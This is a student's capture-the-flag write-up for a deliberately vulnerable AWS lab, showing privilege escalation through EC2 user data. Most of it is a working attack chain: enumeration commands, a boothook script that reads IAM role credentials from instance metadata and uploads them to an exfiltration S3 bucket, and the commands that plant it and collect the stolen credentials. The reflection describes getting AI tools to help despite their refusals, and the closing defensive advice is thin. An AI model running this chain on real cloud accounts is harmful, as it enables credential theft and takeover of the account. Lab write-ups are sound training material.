## Steps
## Step 1:
Getting the information using the command aws sts get-caller-identity. And then I checked the scope of permission assigned to the user. Using the command aws iam list-users I will be able to see the list of users and check who has the higher privilege. And then run the command aws iam list-attached-user-policies --user-name <dev-user> so I could see the attached list of policy of the user. Alternatively, I could use this command: aws iam get-account-authorization-details to see more details of users in one call.

## Step 2:
Make sure you are using the dev user with the AdministratorAccess to EC2 by using the command aws sts get-caller-identity which is “iam-privesc-ec2-xt055mvh-dev-user”.

By using this command it will show running ec2 instances in table view for easier to read.
aws ec2 describe-instances `
  --profile dev_user `
  --region us-east-1 `
  --filters "Name=instance-state-name,Values=running" `
  --query "Reservations[*].Instances[*].[InstanceId,PrivateIpAddress,Tags[?Key=='Name'].Value|[0],IamInstanceProfile.Arn]" `
  --output table

After confirming the ec2 instance, you can also run the command terraform output target_ec2_info to get the information.

Check for EC2 instances running using the command aws ec2 describe-instances and to check more detailed using the command aws ec2 describe-instances –filters “Name=instance-state-name, Values=running” and aws ec2 describe-instances –filters “Name=instance-state-name, Values=stopped”
or
aws ec2 describe-instances --query "Reservations[*].Instances[*].{InstanceId:InstanceId,PrivateIpAddress:PrivateIpAddress,State:State.Name}" --output table

Step 3:
I then scanned for accessible endpoints and storage to determine if there were instance connected to any databases or S3 buckets. I ran the command to check for VPC endpoints:

aws ec2 describe-vpc-endpoints --query "VpcEndpoints[*].{VpcEndpointId:VpcEndpointId,ServiceName:ServiceName,State:State}" --output table

After getting the information on S3 bucket and keys, I created a user data modifying the EC2 to export credentials to S3.

## Gemini Output:
## Modified user data:
#cloud-boothook
#!/bin/bash

# Fetch IMDSv2 token (IMDSv1 also works in this lab)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

CREDENTIALS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}")

ACCESS_KEY=$(echo "$CREDENTIALS" | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
SECRET_KEY=$(echo "$CREDENTIALS" | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")
SESSION_TOKEN=$(echo "$CREDENTIALS" | python3 -c "import sys,json; print(json.load(sys.stdin)['SessionToken'])")

REGION="us-east-1"
BUCKET_NAME="iam-privesc-ec2-XXXXXXXX-exfil-bucket"   # from terraform output

cat <<EOF > /tmp/creds.txt
export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
export AWS_SESSION_TOKEN="$SESSION_TOKEN"
export AWS_DEFAULT_REGION="$REGION"
EOF

aws s3 cp /tmp/creds.txt "s3://${BUCKET_NAME}/creds.txt"
rm -f /tmp/creds.txt

## Step 4:
Stop the instance to modify the user data.
aws ec2 stop-instances –instance-ids <instance-id>

To check for status:
aws ec2 wait instance-stopped --instance-ids i-0123456789abcdef0 or 
aws ec2 describe-instances --instance-ids i-041c7126bf49bd636 --profile dev_user --query "Reservations[0].Instances[0].State.Name" --output text

Now, modify the ec2 instance using this command:
$userData = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content -Raw -Path "user_data.txt")))

aws ec2 modify-instance-attribute `
  --instance-id i-041c7126bf49bd636 `
  --attribute userData `
  --value $userData `
  --profile dev_user `
  --region us-east-1

After applying the modification, start the instance using this command:
aws ec2 start-instances --instance-ids i-041c7126bf49bd636 --profile dev_user --region us-east-1

Run this command to check if the exported file is in S3 bucket
aws s3 ls s3://iam-privesc-ec2-xt055mvh-exfil-bucket/ --profile dev_user
aws s3 cp s3://iam-privesc-ec2-xt055mvh-exfil-bucket/creds.txt . --profile dev_user

After getting the credentials file, you can now fetch the flag using this command:
# Set env vars from creds.txt contents, then:
aws sts get-caller-identity

Download the file:
aws s3 cp s3://iam-privesc-ec2-xt055mvh-secret-flag/flag.txt .

View contents of the flag:
Get-Content .\flag.txt


## Reflection:

### What was your approach?
My approach started by confirming my identity with aws sts get-caller-identity and reviewing IAM permissions to understand what iam-privesc-ec2-xt055mvh-dev-user could do. I then enumerated EC2 instances and found the target in a private subnet with a highly privileged IAM role attached, and used VPC endpoint and S3 recon to identify the exfiltration bucket the instance could reach. Since SSM was not available, I stopped the instance, injected a #cloud-boothook user data script (base64-encoded) to pull temporary credentials from the instance metadata and upload them to the exfil bucket, then restarted the instance. Finally, I downloaded creds.txt from S3, used those stolen administrator credentials, and retrieved the flag from s3://iam-privesc-ec2-xt055mvh-secret-flag/flag.txt.

### What was the biggest challenge?
My biggest challenge was that if the challenge provided no hints or guidance, it was difficult to know where to start. Another challenge was using AI for security breach–related tasks. When given direct prompts about security breaches, AI often would not provide detailed instructions, although it could still suggest certain aws commands that were relevant to the investigation.

### How did you overcome the challenges?
I searched online on related cases of IAM privilege escalation and how they do it. From that I was able to get an idea where to start and what aws commands to run. And I also looked up on the aws cheat sheet and cli commands.

### What led to the breakthrough?
The breakthrough came when I connected three pieces of recon: the target EC2 had an IAM role with AdministratorAccess, the private subnet had an S3 VPC endpoint, and dev_user could read from the exfil bucket. That made it clear I could not use SSM on the isolated instance, but I could modify its user data on stop/start to pull credentials from the instance metadata and upload them to S3. The attack worked once I used #cloud-boothook (so the script ran after restart), base64-encoded the user data correctly, and saw creds.txt appear in the exfil bucket—confirming I had stolen the admin role credentials and could reach the protected flag bucket.

### On the blue side, how can the learning be used to properly defend the important assets?
To defend important assets:
1. You must not publicy showcase your API and credentials
2. Give AdministratorAccess to those necessary roles
3. Rotate keys

References:
https://github.com/studybox9999-cmd/AWS-cheet-sheet/blob/main/aws_cli_cheatsheet.pdf
https://cloudsecurityalliance.org/blog/2022/09/12/how-identifying-userdata-script-manipulation-accelerates-investigation#
https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
https://dev.to/karanvaghela/building-an-intentionally-vulnerable-aws-lab-to-teach-cloud-security-77f
https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ec2-privesc/index.html
https://gemini.google.com/app